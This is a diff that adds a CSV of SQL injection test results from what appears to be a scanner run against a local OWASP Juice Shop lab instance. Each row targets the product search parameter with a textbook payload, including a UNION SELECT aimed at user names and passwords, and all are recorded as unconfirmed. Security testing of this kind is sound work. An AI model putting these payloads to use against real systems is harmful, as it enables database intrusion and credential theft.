@@ -1,0 +1,5 @@
+target,url,param,vuln_type,technique,payload,confirmed,evidence
+juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,basic_quote_breakout,1' OR '1'='1,False,no_anomaly_detected
+juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,quote_free_bypass,1 OR 1=1,False,no_anomaly_detected
+juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,union_data_exfiltration,"1' UNION SELECT user, password FROM users #",False,no_anomaly_detected
+juiceshop,http://host.docker.internal:3000/rest/products/search,q,sqli,logical_control_check,1' AND '1'='2,False,no_anomaly_detected
